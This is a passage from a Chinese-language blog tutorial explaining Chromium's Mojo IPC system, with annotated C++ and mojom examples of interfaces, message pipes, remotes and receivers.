&#123;</span><br><span class="line">  GetInterface(mojo_base.mojom.GenericPendingReceiver receiver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于GenericPendingReceiver可以从任何PendingReceiver隐式构造，所以可以使用之前通过BindNewPipeAndPassReceiver创建的receiver来调用此方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RenderFrame* my_frame = GetMyFrame();</span><br><span class="line">my_frame-&gt;GetBrowserInterfaceBroker().GetInterface(<span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br></pre></td></tr></table></figure><p>这将传送PendingReceiver到browser进程里，并被BrowserInterfaceBroker接口的具体实现接收和处理。</p><h5 id="实现interface"><a href="#实现interface" class="headerlink" title="实现interface"></a>实现interface</h5><p>我们需要一个browser-side的PingResponder实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"example/public/mojom/ping_responder.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PingResponderImpl</span> :</span> example::mojom::PingResponder &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// impl里保存receiver_</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PingResponderImpl</span><span class="params">(mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// example::mojom::PingResponder:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Ping</span><span class="params">(PingCallback callback)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Respond with a random 4, chosen by fair dice roll.</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(<span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;example::mojom::PingResponder&gt; receiver_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(PingResponderImpl);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>RenderFrameHostImpl保存一个BrowserInterfaceBroker的实现，当此实现收到GetInterface方法调用时，它将调用先前为此特定接口注册的处理程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// render_frame_host_impl.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RenderFrameHostImpl</span></span></span><br><span class="line"><span class="class">  ...</span></span><br><span class="line"><span class="class">  <span class="title">void</span> <span class="title">GetPingResponder</span>(<span class="title">mojo</span>:</span>:PendingReceiver&lt;example::mojom::PingResponder&gt; receiver);</span><br><span class="line">  ...</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;PingResponderImpl&gt; ping_responder_;</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// BrowserInterfaceBroker implementation through which this</span></span><br><span class="line">  <span class="comment">// RenderFrameHostImpl exposes document-scoped Mojo services to the currently</span></span><br><span class="line">  <span class="comment">// active document in the corresponding RenderFrame.</span></span><br><span class="line">  BrowserInterfaceBrokerImpl&lt;RenderFrameHostImpl, RenderFrameHost*&gt; broker_&#123;</span><br><span class="line">      <span class="keyword">this</span>&#125;;</span><br><span class="line">  mojo::Receiver&lt;<span class="built_in">blink</span>::mojom::BrowserInterfaceBroker&gt; broker_receiver_&#123;</span><br><span class="line">      &amp;broker_&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// render_frame_host_impl.cc</span></span><br><span class="line"><span class="comment">// 可以看到GetPingResponder使用receiver构造出了一个PingResponderImpl对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RenderFrameHostImpl::GetPingResponder</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span> </span>&#123;</span><br><span class="line">  ping_responder_ = <span class="built_in">std</span>::make_unique&lt;PingResponderImpl&gt;(<span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// browser_interface_binders.cc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host,</span></span></span><br><span class="line"><span class="function"><span class="params">                          mojo::BinderMap* <span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Register the handler for PingResponder.</span></span><br><span class="line">  <span class="built_in">map</span>-&gt;Add&lt;example::mojom::PingResponder&gt;(base::BindRepeating(</span><br><span class="line">    &amp;RenderFrameHostImpl::GetPingResponder, base::Unretained(host)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们完成了,此设置足以在renderer frame与其browser-side host之间建立新的接口连接！<br>假设我们在render中将ping_responder对象保持足够长的生命，我们最终将看到其OnPong回调将以参数4调用，如上面的browser端实现所定义。</p><h3 id="Mojo-Basics"><a href="#Mojo-Basics" class="headerlink" title="Mojo Basics"></a>Mojo Basics</h3><h4 id="Interfaces"><a href="#Interfaces" class="headerlink" title="Interfaces"></a>Interfaces</h4><p>同上，我们再看一组interface和它的impl<br><strong>Mojo通过callback来返回result，即正常我们看到的是return一个返回值return_value，而mojo则是在最后调用callback(return_value)来返回result</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> math.mojom;</span><br><span class="line"></span><br><span class="line">interface Math &#123;</span><br><span class="line">  <span class="comment">// Adds two int32s and returns the result as an int64 (to avoid</span></span><br><span class="line">  <span class="comment">// overflow issues).</span></span><br><span class="line">  Add(int32 x, int32 y) =&gt; (int64 sum);</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line">mojom(<span class="string">"mojom"</span>) &#123;</span><br><span class="line">  sources = [<span class="string">"math.mojom"</span>]</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">class MathImpl : <span class="keyword">public</span> math::mojom::Math &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">explicit</span> MathImpl(mojo::PendingReceiver&lt;math::mojom::Math&gt; receiver)</span><br><span class="line">      : receiver_(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver)) &#123;&#125;</span><br><span class="line">  <span class="comment">// math::mojom::Math overrides:</span></span><br><span class="line">  <span class="comment">// Note: AddCallback is a type alias for base::OnceCallback&lt;void(int64_t)&gt;.</span></span><br><span class="line">  <span class="comment">// The parameters to the callback are the reply parameters specified in the</span></span><br><span class="line">  <span class="comment">// Mojo IDL method definition. This is part of the boilerplate generated by</span></span><br><span class="line">  <span class="comment">// Mojo: invoking |reply| will send a reply to the caller.</span></span><br><span class="line">  <span class="keyword">void</span> Add(<span class="keyword">int32_t</span> x, <span class="keyword">int32_t</span> y, AddCallback reply) <span class="keyword">override</span> &#123;</span><br><span class="line">    <span class="comment">// Note: Mojo always returns results via callback. While it is possible to</span></span><br><span class="line">    <span class="comment">// make a sync IPC which blocks on the reply, the handler will always return</span></span><br><span class="line">    <span class="comment">// the result via callback.</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(reply).Run(<span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(x) + y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// Wraps a message pipe endpoint that receives incoming messages. See the</span></span><br><span class="line">  <span class="comment">// message pipes section below for more information.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wrap消息管道的receiver端</span></span><br><span class="line">  mojo::Receiver&lt;math::mojom::Math&gt; receiver_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="Message-Pipes"><a href="#Message-Pipes" class="headerlink" title="Message Pipes"></a>Message Pipes</h4><p>message pipe的两端已经在上面说过了，不再赘述</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Wraps a message pipe endpoint for making remote calls. May only be used on</span></span><br><span class="line"><span class="comment">// the sequence where the mojo::Remote was bound.</span></span><br><span class="line">mojo::Remote&lt;math::mojom::Math&gt; remote_math = ...;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 通常是保存在mojo impl里的一个类成员，wrap message pipe的receiver端，其分发ipc消息到具体的handler（典型的来说，就是发给this,也就是impl)，</span></span><br><span class="line"><span class="comment">// Usually a class member. Wraps a message pipe endpoint that receives incoming</span></span><br><span class="line"><span class="comment">// messages. Routes and dispatches IPCs to the handler—typically |this|—on the</span></span><br><span class="line"><span class="comment">// sequence where the mojo::Receiver was bound.</span></span><br><span class="line">mojo::Receiver&lt;math::mojom::Math&gt; receiver_;</span><br></pre></td></tr></table></figure><p>总之，作为结论，对于某一个interface，sender A可以向receiver B进行任意数量的call，而B则可以针对A的每一次call发送一个response给A处理，这就体现出了一种有限的双向通信。<br>Message Pipes可以使用下述方法创建</p><h5 id="mojo-Remote-BindNewPipeAndPassReceiver"><a href="#mojo-Remote-BindNewPipeAndPassReceiver" class="headerlink" title="mojo::Remote::BindNewPipeAndPassReceiver"></a>mojo::Remote::BindNewPipeAndPassReceiver</h5><p>当sender/caller创建endpoint时使用。保留一个endpoint以发送IPC消息，另一端点作为未绑定的<code>mojo::PendingReceiver&lt;T&gt;</code>返回，以便receiver/callee绑定到<code>mojo::Receiver&lt;T&gt;</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;math::mojom::Math&gt; remote_math;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BindNewPipeAndPassReceiver返回一个mojo::PendingReceiver&lt;math::mojom::Math&gt;.</span></span><br><span class="line"><span class="comment">// 这可以被bound到一个mojo::Receiver&lt;math::mojom::Math&gt;去处理来自remote_math的调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BindNewPipeAndPassReceiver() returns a</span></span><br><span class="line"><span class="comment">// mojo::PendingReceiver&lt;math::mojom::Math&gt;. This may be bound to a</span></span><br><span class="line"><span class="comment">// mojo::Receiver&lt;math::mojom::Math&gt; to handle calls received from</span></span><br><span class="line"><span class="comment">// |remote_math|.</span></span><br><span class="line">LaunchAndBindRemoteMath(remote_math.BindNewPipeAndPassReceiver());</span><br><span class="line"></span><br><span class="line"><span class="comment">// remote_math可以立刻被使用，Add call消息将在receiving端排队，直到其被bound到一个mojo::Receiver&lt;math::mojom::Math&gt;.</span></span><br><span class="line"><span class="comment">// 例如，被mojom的impl使用其构造receive_字段以隐式绑定或者显式的通过::Bind来绑定。</span></span><br><span class="line"><span class="comment">// |remote_math| may be immediately used. The Add() call will be buffered by the</span></span><br><span class="line"><span class="comment">// receiving end and dispatched when mojo::PendingReceiver&lt;math::mojom::Math&gt; is</span></span><br><span class="line"><span class="comment">// bound to a mojo::Receiver&lt;math::mojom::Math&gt;.</span></span><br><span class="line">remote_math-&gt;Add(<span class="number">2</span>, <span class="number">2</span>, base::BindOnce(...));</span><br></pre></td></tr></table></figure><h5 id="mojo-Receiver-BindNewPipeAndPassRemote"><a href="#mojo-Receiver-BindNewPipeAndPassRemote" class="headerlink" title="mojo::Receiver::BindNewPipeAndPassRemote"></a>mojo::Receiver::BindNewPipeAndPassRemote</h5><p>在receiver/callee创建端点时使用。保留一个端点以接收IPC，另一个端点作为未绑定的<code>mojo::PendingRemote&lt;T&gt;</code>返回，以使sender/caller方绑定到<code>mojo::Remote&lt;T&gt;</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathImpl</span> :</span> <span class="keyword">public</span> math::mojom::MathImpl &#123;</span><br><span class="line">  <span class="comment">// ...addition to the previous MathImpl definition...</span></span><br><span class="line"></span><br><span class="line">  <span class="function">mojo::PendingRemote&lt;math::mojom::Math&gt; <span class="title">GetRemoteMath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// BindNewPipeAndPassRemote() returns a</span></span><br><span class="line">    <span class="comment">// `mojo::PendingRemote&lt;math::mojom::Math&gt;`. This may be bound to a</span></span><br><span class="line">    <span class="comment">// `mojo::Remote&lt;math::mojom::Math&gt; which can be used to send IPCs that will</span></span><br><span class="line">    <span class="comment">// be handled by |this|.</span></span><br><span class="line">    <span class="keyword">return</span> receiver_.BindNewPipeAndPassRemote();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="mojo-PendingRemote-InitWithNewPipeAndPassReceiver"><a href="#mojo-PendingRemote-InitWithNewPipeAndPassReceiver" class="headerlink" title="mojo::PendingRemote::InitWithNewPipeAndPassReceiver"></a>mojo::PendingRemote::InitWithNewPipeAndPassReceiver</h5><p>不太常见，类似于<code>mojo::Remote&lt;T&gt;::BindNewPipeAndPassReceiver()</code></p><h5 id="mojo-Remote-mojo-Receiver-and-mojo-PendingRemote-mojo-PendingReceiver"><a href="#mojo-Remote-mojo-Receiver-and-mojo-PendingRemote-mojo-PendingReceiver" class="headerlink" title="mojo::Remote/mojo::Receiver and mojo::PendingRemote/mojo::PendingReceiver"></a>mojo::Remote/mojo::Receiver and mojo::PendingRemote/mojo::PendingReceiver</h5><p><code>mojo::Remote&lt;T&gt;</code>和<code>mojo::Receiver&lt;T&gt;</code>都有相应的未绑定版本:这允许在同一进程中的sequences之间,甚至在IPC上的进程之间传递端点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;math::mojom::MathImpl&gt; remote = ...;</span><br><span class="line"><span class="comment">// |pending_remote| 是可移动的，并且可能会被传递。</span></span><br><span class="line"><span class="comment">// 未绑定时，端点不能用于发送IPC。pending_remote可以传递给mojo::Remote &lt;T&gt;构造函数或mojo::Remote&lt;T&gt;::Bind()来重新绑定端点。</span></span><br><span class="line"><span class="comment">// |pending_remote| is movable and may be passed around. While unbound, the</span></span><br><span class="line"><span class="comment">// endpoint cannot be used to send IPCs. The pending remote may be passed to</span></span><br><span class="line"><span class="comment">// the mojo::Remote&lt;T&gt; constructor or mojo::Remote&lt;T&gt;::Bind() to rebind the</span></span><br><span class="line"><span class="comment">// endpoint.</span></span><br><span class="line">mojo::PendingRemote&lt;math::mojom::MathImpl&gt; pending_remote = remote.Unbind();</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mojo::Receiver&lt;math::mojom::MathImpl&gt; receiver = ...;</span><br><span class="line"><span class="comment">// |pending_receiver| is movable and may be passed around. While unbound,</span></span><br><span class="line"><span class="comment">// received IPCs are buffered and not processed. The pending receiver may be</span></span><br><span class="line"><span class="comment">// passed to the mojo::Receiver&lt;T&gt; constructor or mojo::Receiver&lt;T&gt;::Bind() to</span></span><br><span class="line"><span class="comment">// rebind the endpoint.</span></span><br><span class="line">mojo::PendingReceiver&lt;math::mojom::MathImpl&gt; pending_receiver = receiver.Unbind();</span><br></pre></td></tr></table></figure><p>这里的bind和unbind实际上是通过在receiver里保存一个bind state对象来维护的，具体的不叙，可以参考<a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/bindings/receiver.h" target="_blank" rel="noopener">具体代码</a></p><h3 id="Mojo-C-Bindings-API"><a href="#Mojo-C-Bindings-API" class="headerlink" title="Mojo C++ Bindings API"></a>Mojo C++ Bindings API</h3><h4 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;db.mojom</span><br><span class="line">module db.mojom;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  AddRow(int32 key, string data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Database &#123;</span><br><span class="line">  CreateTable(Table&amp; table);</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;BUILD.gn</span><br><span class="line">import(&quot;&#x2F;&#x2F;mojo&#x2F;public&#x2F;tools&#x2F;bindings&#x2F;mojom.gni&quot;)</span><br><span class="line"></span><br><span class="line">mojom(&quot;mojom&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;db.mojom&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">   deps +&#x3D; [ &#39;&#x2F;&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#39; ]</span><br><span class="line">...</span><br><span class="line">运行ninja -C out&#x2F;r services&#x2F;db&#x2F;public&#x2F;mojom会生成</span><br><span class="line">-&gt;</span><br><span class="line">out&#x2F;gen&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;db.mojom.cc</span><br><span class="line">out&#x2F;gen&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;db.mojom.h</span><br></pre></td></tr></table></figure><p>你能在源码里包含上面生成的头文件，以使用其定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"services/business/public/mojom/factory.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableImpl</span> :</span> <span class="keyword">public</span> db::mojom::Table &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>本文档涵盖了Mojom IDL为C++使用者生成的各种定义，以及如何有效地使用它们,在消息管道之间进行通信。</p><h4 id="Interfaces-1"><a href="#Interfaces-1" class="headerlink" title="Interfaces"></a>Interfaces</h4><h5 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h5><p>让我们看一下<code>//sample/logger.mojom</code>里定义的简单的接口，以及client如何使用他们去log simple string message。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module sample.mojom;</span><br><span class="line"></span><br><span class="line">interface Logger &#123;</span><br><span class="line">  Log(string message);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过binding generator将生成下面的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> sample &#123;</span><br><span class="line"><span class="keyword">namespace</span> mojom &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> &#123;</span></span><br><span class="line">  <span class="keyword">virtual</span> ~Logger() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace mojom</span></span><br><span class="line">&#125;  <span class="comment">// namespace sample</span></span><br></pre></td></tr></table></figure><h5 id="Remote-and-PendingReceiver"><a href="#Remote-and-PendingReceiver" class="headerlink" title="Remote and PendingReceiver"></a>Remote and PendingReceiver</h5><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-074647.jpg" alt=""></p><h5 id="Creating-Interface-Pipes"><a href="#Creating-Interface-Pipes" class="headerlink" title="Creating Interface Pipes"></a>Creating Interface Pipes</h5><p>一种方法是手动创建pipe，并用强类型对象包装两端：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sample/logger.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line">mojo::MessagePipe pipe;</span><br><span class="line"><span class="function">mojo::Remote&lt;sample::mojom::Logger&gt; <span class="title">logger</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingRemote&lt;sample::mojom::Logger&gt;(<span class="built_in">std</span>::<span class="built_in">move</span>(pipe.handle0), <span class="number">0</span>))</span></span>;</span><br><span class="line"><span class="function">mojo::PendingReceiver&lt;sample::mojom::Logger&gt; <span class="title">receiver</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">move</span>(pipe.handle1))</span></span>;</span><br></pre></td></tr></table></figure><p>这很冗长，所以c++ binding库提供了更简便的方法来完成这件事。<a href="https://cs.chromium.org/chromium/src/mojo/public/cpp/bindings/remote.h" target="_blank" rel="noopener">remote.h</a>定义了BindNewPipeAndPassReceiver</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;sample::mojom::Logger&gt; logger;</span><br><span class="line"><span class="keyword">auto</span> receiver = logger.BindNewPipeAndPassReceiver());</span><br></pre></td></tr></table></figure><p>这个代码和之前的等价。</p><p>绑定<code>PendingRemote&lt;Logger&gt;</code>后，我们可以立即开始在其上调用Logger接口方法，该方法将立即将消息写入管道。这些消息将在管道的receiver排队，直到有人绑定到receiver并开始读取它们为止。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger-&gt;Log(&quot;Hello!&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-080009.jpg" alt=""><br>但是<code>PendingReceiver&lt;T&gt;</code>本质上只是一个类型化的容器，用于容纳<code>Remote&lt;T&gt;</code>管道的另一端（即接收端），直到将其绑定到接口的具体实现上。 <code>PendingReceiver&lt;T&gt;</code>实际上除了保留管道端点并携带有用的编译时类型信息外，没有做任何其他事情。<br>因此该消息将永远存在于管道中。我们需要一种从管道的另一端读取消息并进行分发的方法。我们必须<strong>bind这个pending receiver</strong></p><h5 id="Binding-a-Pending-Receiver"><a href="#Binding-a-Pending-Receiver" class="headerlink" title="Binding a Pending Receiver"></a>Binding a Pending Receiver</h5><p>这有许多不同的helper类，用于binding message pipe的receiver端，其中最原始的是<code>mojo::Receiver&lt;T&gt;</code>，<code>mojo::Receiver&lt;T&gt;</code>将T的impl和单个的message pipe端点<code>mojo::PendingReceiver&lt;T&gt;</code>绑定到一起，并监视是否有新消息发送过来。<br>每当bound pipe有新消息可读，Receiver都会安排一个task去读，反序列化消息并将其分发到其绑定的impl去。<br>下面是Logger接口的示例实现，注意，一般implement会own <code>mojo::Receiver</code>字段，这是一种常见的模式。因为<strong>绑定的implement必须比绑定它的任何mojo::Receiver存活的更久</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"base/logging.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"base/macros.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sample/logger.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerImpl</span> :</span> <span class="keyword">public</span> sample::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> A common pattern for interface implementations which have one</span></span><br><span class="line">  <span class="comment">// instance per client is to take a PendingReceiver in the constructor.</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">LoggerImpl</span><span class="params">(mojo::PendingReceiver&lt;sample::mojom::Logger&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~Logger() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sample::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] 